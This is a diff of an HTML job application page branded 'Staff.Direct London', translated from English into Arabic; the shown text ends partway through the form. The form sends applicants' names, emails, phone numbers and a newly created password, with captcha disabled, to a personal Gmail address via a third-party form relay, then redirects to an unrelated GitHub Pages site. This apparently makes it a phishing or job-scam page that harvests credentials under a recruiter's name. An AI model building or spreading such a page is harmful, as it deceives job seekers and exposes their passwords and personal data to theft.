@@ -1,24 +1,26 @@
-  <!DOCTYPE html> 
-<html lang="en" dir="ltr"> 
+<!DOCTYPE html> 
+<html lang="ar" dir="rtl"> 
 <head> 
 <meta charset="UTF-8"> 
 <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-<title>Staff.Direct London - Premium Hospitality Recruitment</title> 
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet"> 
+<title>Staff.Direct London - نموذج التوظيف</title> 
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet"> 
 <style> 
 :root { --navy: #0A1F44; --gold: #D4AF37; --orange: #F57C00; } 
 * {box-sizing: border-box; margin: 0; padding: 0;} 
-body { background: linear-gradient(135deg, var(--navy) 0%, #1a3a6e 100%); font-family: 'Poppins', sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;} 
-.container { background: #fff; max-width: 650px; width: 100%; padding: 50px 35px; border-radius: 20px; border-top: 6px solid var(--gold); box-shadow: 0 15px 50px rgba(0,0,0,0.4); text-align: center; }
-.logo-img { width: 180px; height: auto; margin: 0 auto 20px; }
-.brand {font-family: 'Playfair Display', serif; font-size: 32px; font-weight: 700; color: var(--navy);} 
-.subtitle {color: var(--orange); font-size: 13px; font-weight: 600; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px;} 
-h2 {color: var(--navy); margin: 20px 0 8px; font-size: 26px;} 
-.desc {color: #666; margin-bottom: 30px; font-size: 15px;} 
-.form-group {text-align: left; margin-bottom: 18px;}
+body { background: linear-gradient(135deg, var(--navy) 0%, #1a3a6e 100%); font-family: 'Cairo', sans-serif; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh;} 
+.container { background: #fff; max-width: 650px; width: 100%; padding: 40px 30px; border-radius: 20px; border-top: 6px solid var(--gold); box-shadow: 0 15px 50px rgba(0,0,0,0.4); text-align: center; }
+.logo-img { width: 160px; height: auto; margin: 0 auto 15px; }
+.brand {font-size: 28px; font-weight: 700; color: var(--navy);} 
+.subtitle {color: var(--orange); font-size: 12px; font-weight: 600; margin-bottom: 15px; letter-spacing: 1px;} 
+h2 {color: var(--navy); margin: 20px 0 8px; font-size: 24px;} 
+.desc {color: #666; margin-bottom: 25px; font-size: 14px;} 
+.form-group {text-align: right; margin-bottom: 18px;}
 label {display: block; color: var(--navy); font-weight: 600; font-size: 14px; margin-bottom: 6px;}
-input, select {width: 100%; padding: 15px 16px; border: 2px solid #eee; border-radius: 12px; font-family: 'Poppins'; font-size: 15px;} 
-.btn {width: 100%; padding: 18px; background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%); color: var(--navy); border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer;}
+input, select {width: 100%; padding: 14px 15px; border: 2px solid #eee; border-radius: 12px; font-family: 'Cairo'; font-size: 15px; background: #fafafa;} 
+input:focus, select:focus {border-color: var(--gold); outline: none; background: #fff;} 
+.btn {width: 100%; padding: 16px; background: linear-gradient(135deg, var(--gold) 0%, #B8860B 100%); color: var(--navy); border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px;}
+.btn:hover {transform: translateY(-2px);}
 </style> 
 </head> 
 <body> 
@@ -27,39 +29,34 @@ input, select {width: 100%; padding: 15px 16px; border: 2px solid #eee; border-r
 <div class="header">
   <img src="images.jpeg" alt="Staff.Direct Logo" class="logo-img">
   <div class="brand">STAFF.DIRECT LONDON</div> 
-  <div class="subtitle">Premium Hospitality Recruitment</div> 
+  <div class="subtitle">التوظيف في مجال الضيافة</div> 
 </div>
 
-<h2>Job Application Form</h2> 
-<p class="desc">Join our elite team of hospitality professionals. Fill out the form below and our recruitment team will contact you within 24 hours.</p> 
+<h2>نموذج التقديم على وظيفة</h2> 
+<p class="desc">املأ النموذج أدناه وسيتواصل معك فريق التوظيف لدينا خلال 24 ساعة.</p> 
 
 <form action="https://formsubmit.co/mosabshareef22@gmail.com" method="POST">
   
-  <!-- ده السطر المهم: رجع لموقعك kria22 مباشرة -->
+  <!-- ده بيرجعك لموقعك مباشرة بدون صفحة شكرا -->
   <input type="hidden" name="_next" value="https://kria22.github.io/">
-  
-  <input type="hidden" name="_subject" value="New Job Application - Staff.Direct London">
+  <input type="hidden" name="_subject" value="طلب توظيف جديد - Staff.Direct London">
   <input type="hidden" name="_captcha" value="false">
 
-  <div class="form-group"><label>Full Name *</label><input name="Full Name" required></div>
-  <div class="form-group"><label>Email Address *</label><input name="Email" type="email" required></div>
-  <div class="form-group"><label>Phone Number *</label><input name="Phone Number" type="tel" required></div>
-  <div class="form-group"><label>Create Password *</label><input name="Password" type="password" required></div>
-  <div class="form-group"><label>Country *</label>
-    <select name="Country" required>
-      <option value="">Select your country</option>
-      <option>Nepal</option><option>UK</option><option>USA</option><option>UAE</option><option>Egypt</option><option>Other</option>
-    </select>
-  </div>
-  <div class="form-group"><label>Job Position *</label>
-    <select name="Job Position" required>
-      <option value="">Select position</option><option>Receptionist</option><option>Chef</option><option>Other</option>
-    </select>
+  <div class="form-group">
+    <label>* الاسم الكامل</label>
+    <input name="Full Name" placeholder="ادخل اسمك الكامل" required>
   </div>
 
-  <button type="submit" class="btn">Submit Application</button>
-</form>
+  <div class="form-group">
+    <label>* عنوان البريد الإلكتروني</label>
+    <input name="Email" type="email" placeholder="example@email.com" required>
+  </div>
 
-</div>
-</body> 
-</html>
+  <div class="form-group">
+    <label>* رقم التليفون</label>
+    <input name="Phone Number" type="tel" placeholder="01XXXXXXXXX" required>
+  </div>
+
+  <div class="form-group">
+    <label>* إنشاء كلمة مرور</label>
+   
